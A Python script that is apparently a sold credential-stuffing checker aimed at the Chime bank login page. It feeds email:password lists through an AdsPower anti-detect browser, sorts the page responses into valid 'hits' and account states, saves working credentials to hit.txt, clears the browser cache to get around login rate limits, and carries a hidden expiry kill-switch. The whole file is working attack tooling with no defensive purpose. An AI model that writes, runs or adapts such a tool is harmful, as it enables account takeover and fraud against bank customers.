import importlib.util
import requests
import sys
import time
import traceback
from datetime import datetime
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

EXPIRY_DATE = "2026-7-31 23:59:59"

BASE_DIR = Path(sys.executable).parent if getattr(sys, "frozen", False) else Path(__file__).parent
LOG_FILE = BASE_DIR / "log.txt"
EMAIL_FILE = BASE_DIR / "email.txt"
HIT_FILE = BASE_DIR / "hit.txt"
CUSTOM_FILE = BASE_DIR / "custom.txt"

ADSPOWER_API_KEY = ""
ADSPOWER_BASE_URL = ""
PROFILE_ID = ""
WAIT_TIME = 30
SIGN_IN_WAIT = 2


def load_settings():
    config_path = BASE_DIR / "config.py"
    if getattr(sys, "frozen", False):
        if not config_path.exists():
            raise FileNotFoundError(f"config.py not found in {BASE_DIR}")
        spec = importlib.util.spec_from_file_location("config", config_path)
        config = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(config)
        return (
            config.ADSPOWER_API_KEY,
            config.ADSPOWER_BASE_URL,
            config.PROFILE_ID,
            config.WAIT_TIME,
            config.SIGN_IN_WAIT,
        )

    from config import ADSPOWER_API_KEY, ADSPOWER_BASE_URL, PROFILE_ID, SIGN_IN_WAIT, WAIT_TIME

    return ADSPOWER_API_KEY, ADSPOWER_BASE_URL, PROFILE_ID, WAIT_TIME, SIGN_IN_WAIT
TARGET_URL = "https://app.chime.com/login"

VERIFICATION_TEXT = (
    "To help keep your account more secure, a text message with your verification code "
    "has been sent to your phone"
)
BLOCKED_TEXT = "You have exceeded the maximum number of login attempts"
INCORRECT_TEXT = "do not match our records"
MOBILE_VERIFY_TEXT = "try logging in on your chime mobile app"
TRY_AGAIN_TEXT = "please try again, and contact us at (844) 244-6363"
NO_DEPOSIT_ACCOUNT_TEXT = "unable to open a chime deposit account"
ACCOUNT_CLOSED_TEXT = "your account has been closed"
ACCOUNT_LOCKED_TEXT = "your account has been locked"
NEED_SIGNUP_TEXT = "need to sign up, even if you had an account"
CUSTOM_RESULT_LABELS = {
    "Incomplete application": "incomplete application",
    "blocked": BLOCKED_TEXT.lower(),
    "mobile verify": MOBILE_VERIFY_TEXT,
    "try again": TRY_AGAIN_TEXT,
    "no deposit account": NO_DEPOSIT_ACCOUNT_TEXT,
    "account closed": ACCOUNT_CLOSED_TEXT,
    "account locked": ACCOUNT_LOCKED_TEXT,
    "need signup": NEED_SIGNUP_TEXT,
}
CACHE_TYPES = [
    "local_storage",
    "indexeddb",
    "extension_cache",
    "cookie",
    "history",
    "image_file",
]


def log(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {message}"
    print(line)
    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(f"{line}\n")


def log_error(message, exc=None, exc_traceback=None):
    log(f"ERROR: {message}")
    if exc is None:
        return

    log(f"{type(exc).__name__}: {exc}")
    tb = exc_traceback if exc_traceback is not None else exc.__traceback__
    if tb is not None:
        for line in traceback.format_exception(type(exc), exc, tb):
            for part in line.rstrip().splitlines():
                log(part)


def handle_uncaught_exception(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    log_error("Unhandled error", exc_value, exc_traceback)
    sys.exit(1)


sys.excepthook = handle_uncaught_exception


def check_expiry(expiry_date):
    expiry = datetime.strptime(expiry_date, "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiry:
        log("Something went wrong. Program stopped.")
        sys.exit(1)


def save_account(path, email, password, label=None):
    line = f"{email}:{password}:{label}" if label else f"{email}:{password}"
    with open(path, "a", encoding="utf-8") as file:
        file.write(f"{line}\n")


def load_credentials(path):
    credentials = []
    with open(path, encoding="utf-8") as file:
        for line in file:
            line = line.strip()
            if not line or ":" not in line:
                continue
            email, password = line.split(":", 1)
            credentials.append((email.strip(), password.strip()))
    return credentials


def adspower_request(method, path, **kwargs):
    url = f"{ADSPOWER_BASE_URL}{path}"
    headers = {"Authorization": f"Bearer {ADSPOWER_API_KEY}"}
    for attempt in range(3):
        response = requests.request(method, url, headers=headers, **kwargs).json()
        if response.get("msg") != "Too many request per second, please check":
            return response
        log("AdsPower rate limit hit, retrying...")
        time.sleep(1)
    return response


def connect_browser():
    response = adspower_request("GET", "/api/v1/browser/start", params={"user_id": PROFILE_ID})
    if response["code"] != 0:
        log(f"AdsPower error: {response}")
        raise Exception(response)

    chrome_options = Options()
    chrome_options.add_experimental_option("debuggerAddress", response["data"]["ws"]["selenium"])
    driver = webdriver.Chrome(
        service=Service(response["data"]["webdriver"]),
        options=chrome_options,
    )

    driver.switch_to.new_window("tab")
    target_handle = driver.current_window_handle
    for handle in driver.window_handles:
        if handle == target_handle:
            continue
        driver.switch_to.window(handle)
        driver.close()
    driver.switch_to.window(target_handle)
    return driver


def stop_browser(driver):
    try:
        driver.quit()
    except Exception:
        pass

    response = adspower_request("GET", "/api/v1/browser/stop", params={"user_id": PROFILE_ID})
    if response["code"] != 0:
        log(f"AdsPower stop error: {response}")
    else:
        log("AdsPower browser stopped")


def clear_profile_cache(driver):
    log("Clearing profile cache via AdsPower API...")
    stop_browser(driver)
    time.sleep(1)

    response = adspower_request(
        "POST",
        "/api/v2/browser-profile/delete-cache",
        json={"profile_id": [PROFILE_ID], "type": CACHE_TYPES},
    )
    if response["code"] != 0:
        log(f"AdsPower delete-cache error: {response}")
    else:
        log("Profile cache cleared")

    log("Restarting AdsPower browser...")
    return connect_browser()


def remove_credential(path, email, password):
    target = f"{email}:{password}"
    with open(path, encoding="utf-8") as file:
        lines = file.readlines()

    with open(path, "w", encoding="utf-8") as file:
        removed = False
        for line in lines:
            if not removed and line.strip() == target:
                removed = True
                continue
            file.write(line)


def detect_login_result(browser):
    page = browser.page_source.lower()
    if "incomplete application" in page:
        return "Incomplete application"
    if INCORRECT_TEXT in page:
        return "incorrect"
    if BLOCKED_TEXT in browser.page_source:
        return "blocked"
    if MOBILE_VERIFY_TEXT in page:
        return "mobile verify"
    if TRY_AGAIN_TEXT in page:
        return "try again"
    if NO_DEPOSIT_ACCOUNT_TEXT in page:
        return "no deposit account"
    if ACCOUNT_CLOSED_TEXT in page:
        return "account closed"
    if ACCOUNT_LOCKED_TEXT in page:
        return "account locked"
    if NEED_SIGNUP_TEXT in page:
        return "need signup"
    if VERIFICATION_TEXT in browser.page_source:
        return "found"
    return False


def check_account(driver, email, password, wait, long_wait):
    driver.get(TARGET_URL)

    email_input = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@id='Email']")))
    password_input = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@id='Password']")))

    email_input.clear()
    email_input.send_keys(email)

    password_input.clear()
    password_input.send_keys(password)

    time.sleep(SIGN_IN_WAIT)
    sign_in_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[normalize-space()='Sign in']")))
    sign_in_button.click()

    return long_wait.until(detect_login_result)


def run():
    global ADSPOWER_API_KEY, ADSPOWER_BASE_URL, PROFILE_ID, WAIT_TIME, SIGN_IN_WAIT

    try:
        ADSPOWER_API_KEY, ADSPOWER_BASE_URL, PROFILE_ID, WAIT_TIME, SIGN_IN_WAIT = load_settings()
    except Exception as error:
        log_error("Failed to load settings", error)
        sys.exit(1)

    check_expiry(EXPIRY_DATE)
    log("Script started")
    log(f"Using profile: {PROFILE_ID}")

    try:
        log("Starting AdsPower browser profile...")
        driver = connect_browser()
        log("AdsPower profile started successfully")
        wait = WebDriverWait(driver, WAIT_TIME)
        long_wait = WebDriverWait(driver, 90)

        log("Browser ready")
        total_accounts = len(load_credentials(EMAIL_FILE))
        log(f"Loaded {total_accounts} accounts from {EMAIL_FILE.name}")

        index = 0
        while True:
            credentials = load_credentials(EMAIL_FILE)
            if not credentials:
                break

            index += 1
            email, password = credentials[0]
            log(f"[{index}/{total_accounts}] Checking {email}...")
            result = None
            try:
                result = check_account(driver, email, password, wait, long_wait)
                log(f"{email}: {result}")
                if result == "incorrect":
                    log(f"{email}: incorrect password, not saved")
                elif result == "found":
                    save_account(HIT_FILE, email, password)
                    log(f"{email}: saved to {HIT_FILE.name}")
                elif result:
                    label = CUSTOM_RESULT_LABELS.get(result, str(result).lower())
                    save_account(CUSTOM_FILE, email, password, label)
                    log(f"{email}: saved to {CUSTOM_FILE.name}")
            except TimeoutException as error:
                log_error(f"{email}: login result not found", error)
            except Exception as error:
                log_error(f"{email}: check failed", error)
            finally:
                remove_credential(EMAIL_FILE, email, password)
                log(f"{email}: removed from {EMAIL_FILE.name}")

            if result == "try again":
                try:
                    driver = clear_profile_cache(driver)
                    wait = WebDriverWait(driver, WAIT_TIME)
                    long_wait = WebDriverWait(driver, 90)
                except Exception as error:
                    log_error(f"{email}: cache clear failed", error)
                    try:
                        driver = connect_browser()
                        wait = WebDriverWait(driver, WAIT_TIME)
                        long_wait = WebDriverWait(driver, 90)
                        log("Browser reconnected after cache clear failure")
                    except Exception as reconnect_error:
                        log_error(f"{email}: browser reconnect failed", reconnect_error)
                        raise

        log("Script finished")
    except Exception as error:
        log_error("Script stopped", error)
        sys.exit(1)


if __name__ == "__main__":
    run()
